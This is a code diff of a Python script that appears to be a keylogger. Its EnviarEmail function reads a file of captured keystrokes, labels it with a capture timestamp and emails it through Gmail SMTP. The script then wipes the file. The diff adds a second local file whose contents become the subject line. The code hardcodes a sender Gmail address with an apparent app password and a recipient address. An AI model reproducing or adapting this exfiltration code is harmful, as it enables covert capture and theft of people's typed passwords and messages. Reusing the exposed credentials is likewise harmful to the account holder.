@@ -12,13 +12,15 @@ def Timeout():
 
 def EnviarEmail():
     with open (carpeta_destino, 'r+') as f:
-        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        data = f.read().replace("Space"," ").replace("\n","")
-        data = "Mensaje capturado a las: " + fecha + "\n" + data
-        print(data)
-        crearEmail('pabloenriquec256@gmail.com','ywpxtqegplmbkbxt','josearmijos256@gmail.com','nueva captura ' + fecha ,data)
-        f.seek(0)
-        f.truncate()
+        with open ("C:\\Users\\jean0\\OneDrive\\Escritorio\\key\\data.txt", 'r+') as b:
+            fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            data = f.read().replace("Space"," ").replace("\n","")
+            g = b.read()
+            data = "Mensaje capturado a las: " + fecha + "\n" + data
+            print(data)
+            crearEmail('pabloenriquec256@gmail.com','ywpxtqegplmbkbxt','josearmijos256@gmail.com',g ,data)
+            f.seek(0)
+            f.truncate()
 def crearEmail(user,passw,recep,subj,body):
     import smtplib
     mailUser = user
